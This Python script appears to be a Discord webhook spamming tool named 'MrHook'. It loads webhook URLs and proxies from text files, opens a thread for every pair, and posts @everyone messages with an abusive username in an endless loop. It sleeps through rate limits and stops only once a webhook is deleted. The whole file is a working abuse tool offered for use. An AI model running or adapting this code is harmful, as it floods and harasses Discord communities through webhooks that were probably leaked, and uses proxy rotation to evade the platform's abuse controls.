from colorama import Fore, Style, init; init()
from threading import Thread, Lock
import os, requests, time

lock = Lock()
def Printer(color, past, text, proxy):
    lock.acquire()
    print(f'{Fore.LIGHTWHITE_EX}[{color}{past}{Fore.LIGHTWHITE_EX}] {text} ~ {proxy.split("://")[1]}.')
    lock.release()

class MrHook:
    def __init__(self):
        self.proxy_list = []
        self.url_list   = []

        self.send = 0
        self.initialize()
    
    def initialize(self):
        os.system('cls && title Vichy - Mr.Hook' if os.name == 'nt' else 'clear')
        print(f'''{Style.BRIGHT}{Fore.BLUE}
         __  __      _  _  ___   ___  _  __
        |  \/  |_ _ | || |/ _ \ / _ \| |/ /
        | |\/| | '_|| __ | (_) | (_) | ' < 
        |_|  |_|_|{Fore.WHITE}(_){Fore.BLUE}_||_|\___/ \___/|_|\_\\
        ''')

        with open('proxy.txt', 'r') as proxy_file:
            for proxy in proxy_file:
                self.proxy_list.append(proxy.split('\n')[0])

        with open('./url.txt', 'r') as url_file:
            for url in url_file:
                self.url_list.append(url.split('\n')[0])
        
        self.proxy_list = list(set(self.proxy_list))
        self.url_list   = list(set(self.url_list))

    def worker(self, webhook, proxy):
        alive = True

        while alive:
            try:
                response = requests.post(webhook, headers= {'content-type': 'application/json'}, proxies= {'http': proxy, 'https': proxy}, json= { 'content': '> ||<@everyone>|| **MrHook was here** https://github.com/Its-Vichy', 'username': 'Fucked by MrHook' })
                    
                if response.status_code == 204:
                    self.send += 1
                    Printer(Fore.LIGHTGREEN_EX, '+', 'Hook sent', proxy)

                elif response.status_code == 429: # {'global': False, 'message': 'You are being rate limited.', 'retry_after': 23853}
                    #print(response.json())
                    timeout = int(str(response.json()['retry_after'])[2:])
                    Printer(Fore.YELLOW, '~', f'Ratelimited sleep {timeout}s', proxy)
                    time.sleep(timeout)
                    
                elif response.status_code == 404:
                    self.send += 1
                    Printer(Fore.LIGHTMAGENTA_EX, '-', 'Hook deleted', proxy)
                    alive = False
                    break
            except:
                pass
    
    def start_worker(self):
        thread_list = []

        for url in self.url_list:
            for proxy in self.proxy_list:
                thread_list.append(Thread(target= self.worker, args= (url, proxy)))
        
        for thread in thread_list:
            thread.start()
        
        for thread in thread_list:
            thread.join()
        
        print('Finished')

MrHook().start_worker()
